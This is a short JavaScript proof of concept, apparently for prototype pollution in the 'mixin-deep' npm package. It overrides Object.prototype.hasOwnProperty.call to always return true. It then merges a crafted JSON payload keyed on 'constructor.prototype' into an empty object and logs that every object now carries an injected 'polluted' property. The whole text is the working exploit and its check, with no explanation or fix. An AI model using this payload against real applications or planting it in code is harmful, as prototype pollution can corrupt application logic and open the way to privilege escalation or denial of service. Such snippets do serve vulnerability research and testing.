Object.prototype.hasOwnProperty.call = () => true;
const mixin = require('mixin-deep');
const payload = '{"constructor": {"prototype": {"polluted": "yes"}}}';
let obj = {};
console.log({}.polluted);
mixin({}, JSON.parse(payload));
console.log({}.polluted);